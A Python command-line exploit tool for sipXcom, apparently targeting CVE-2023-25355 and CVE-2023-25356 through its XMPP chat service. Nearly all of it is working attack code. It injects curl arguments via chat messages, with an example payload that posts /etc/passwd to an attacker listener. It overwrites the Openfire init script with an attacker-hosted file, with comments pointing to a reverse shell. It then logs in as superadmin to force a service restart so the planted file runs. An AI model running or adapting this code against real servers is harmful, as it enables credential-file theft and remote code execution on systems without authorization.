import click
import os
import xmpp
import logging
import functools
import httpx
import re
from bs4 import BeautifulSoup


def common_params(func):
    @click.option("--xmpp-username", required=True, type=str, help="XMPP source username")
    @click.option("--xmpp-password", required=True, type=str, help="XMPP source password")
    @click.option("--xmpp-target-username", required=True, type=str, help="XMPP target username")
    @click.option("--payload-trigger", type=str, default="@call", help="Payload's trigger")
    @click.option("--payload-prefix", type=str, default="catcher -o prefix.log", help="Payload's prefix")
    @click.option("--payload-suffix", type=str, default="-o suffix.log", help="Payload's suffix")
    @click.option("--xmpp-server-address", required=True, type=str, help="the XMPP address")
    @click.option("--xmpp-server-port", type=int, default="5222", help="the XMPP port")
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        return func(*args, **kwargs)

    return wrapper


cli = click.Group()


@cli.command(context_settings={"show_default": True})
@common_params
@click.option(
    "--payload",
    required=True,
    type=str,
    help="Payload, like: --data-binary @/etc/passwd http://ATTACKER-WEB-LISTENER/some_path",
)
def cve_2023_25355(
    xmpp_username,
    xmpp_password,
    xmpp_target_username,
    payload_trigger,
    payload_prefix,
    payload,
    payload_suffix,
    xmpp_server_address,
    xmpp_server_port,
):
    jid = xmpp.protocol.JID(f"{xmpp_username}@{xmpp_server_address}")
    client = xmpp.Client(jid.getDomain(), debug=[])

    # with python3.12, see https://github.com/xmpppy/xmpppy/pull/70
    if not client.connect(server=(xmpp_server_address, xmpp_server_port), secure=0):
        logging.error("Unable to connect to the server.")
        return False

    if not client.auth(jid.getNode(), xmpp_password, resource=jid.getResource()):
        logging.error("Unable to authenticate.")
        return False

    client.sendInitPresence()

    full_payload = " ".join([payload_trigger, payload_prefix, payload, payload_suffix])
    logging.info(full_payload)

    message = xmpp.protocol.Message(body=full_payload, to=xmpp_target_username, typ="chat")
    client.send(message)
    logging.info("Exploit message sent.")
    client.disconnect()


@cli.command(context_settings={"show_default": True})
@common_params
@click.option(
    "--sipxcom-init-file-source-uri",
    required=True,
    type=str,
    help="The init openfire file URI to download on the sipXcom server",
)
@click.option(
    "--sipxcom-init-file-target-path", default="/etc/init.d/openfire", type=str, help="sipxcom superuser username"
)
@click.pass_context
def cve_2023_25356(
    ctx,
    xmpp_username,
    xmpp_password,
    xmpp_target_username,
    payload_trigger,
    payload_prefix,
    payload_suffix,
    xmpp_server_address,
    xmpp_server_port,
    sipxcom_init_file_source_uri,
    sipxcom_init_file_target_path,
):
    # First, we use the CVE_2023_25355 to overwrite an pwned init file
    # Example with a reverse shell is given in the original exploit.
    # The file should be server from an URI accessible from the sipXcom server.
    payload_25356 = f"-o {sipxcom_init_file_target_path} -X GET {sipxcom_init_file_source_uri}"
    logging.info(f"created payload: {payload_25356}")
    ctx.invoke(
        cve_2023_25355,
        xmpp_username=xmpp_username,
        xmpp_password=xmpp_password,
        xmpp_target_username=xmpp_target_username,
        payload_trigger=payload_trigger,
        payload_prefix=payload_prefix,
        payload_suffix=payload_suffix,
        xmpp_server_address=xmpp_server_address,
        xmpp_server_port=xmpp_server_port,
        payload=payload_25356,
    )
    # If everything works as expected, the init file should have been replaced by yours.
    # Any payload will be trigger once the service restart.
    # If you know have the credentials of a superadmin user, you can try to restart it.


@cli.command(context_settings={"show_default": True})
@click.option("--sipxcom-superuser-username", default="superadmin", type=str, help="sipxcom superuser username")
@click.option("--sipxcom-superuser-password", default="None", type=str, help="sipxcom superuser password")
@click.option(
    "--sipxcom-website", required=True, type=str, help="sipxcom website, example: https://192.168.17.89/sipxconfig"
)
@click.option(
    "--debug-local-directory", default=None, type=str, help="Write html response in case of error. E.g: /tmp/"
)
def restart_xmpp_service_with_superadmin(
    sipxcom_superuser_username, sipxcom_superuser_password, sipxcom_website, debug_local_directory
):
    if sipxcom_website[-1] == "/":
        sipxcom_website = sipxcom_website[:-1]
    with httpx.Client(verify=False) as client:
        # 1. send credentials, we follow redirect as we need to get to the /app page anyway
        login = client.post(
            f"{sipxcom_website}/sipxconfig/j_spring_security_check",
            follow_redirects=True,
            data={"j_username": sipxcom_superuser_username, "j_password": sipxcom_superuser_password},
        )

        # 2. identify the link to manage XMPP
        m = re.search('(/sipxconfig/plugin/InstantMessagingPage.html\?state:[^"]+)', login.text)
        if not m:
            logging.error("link to the InstantMessagingPage was not found in app page. Check login.")
            if debug_local_directory is not None:
                log_file = os.path.join(debug_local_directory, "restart_xmpp_service_with_superadmin-phase-login.html")
                with open(log_file, "w") as w:
                    w.write(login.text)
                logging.error(f"Html file was written in: {log_file}\nfgrep error {log_file}")
            exit(1)
        link_imp = f"{sipxcom_website}{m.group(1)}"
        config_imp = client.post(link_imp, follow_redirects=True)

        # 3. change one parameter
        soup = BeautifulSoup(config_imp.text, features="html.parser")
        form = soup.find(id="form")
        inputs = form.find_all("input")
        form_data = {}
        for i in inputs:
            if i.get("value") is not None:
                form_data[i.get("name")] = i.get("value")
        for checkbox in form.find_all("input", checked=True):
            form_data[checkbox.get("name")] = "on"

        # 4. lets switch setting:enabled_1 to force reload the config
        if "setting:enabled_1" in form_data:
            form_data.pop("setting:enabled_1")
        else:
            form_data["setting:enabled_1"] = "on"
        reloaded = client.post(
            f"{sipxcom_website}/sipxconfig/plugin/InstantMessagingPage,form.sdirect",
            follow_redirects=True,
            data=form_data,
        )

        if reloaded.status_code == 200:
            logging.info("Service should be reloaded with any gadget you installed")
        else:
            logging.error(f"Received code {reloaded.status_code}")
            if debug_local_directory is not None:
                log_file = os.path.join(
                    debug_local_directory, "restart_xmpp_service_with_superadmin-phase-restart.html"
                )
                with open(log_file, "w") as w:
                    w.write(reloaded.text)
                logging.error(f"Html file was written in: {log_file}")
                exit(1)


if __name__ == "__main__":
    cve_2023_25355()
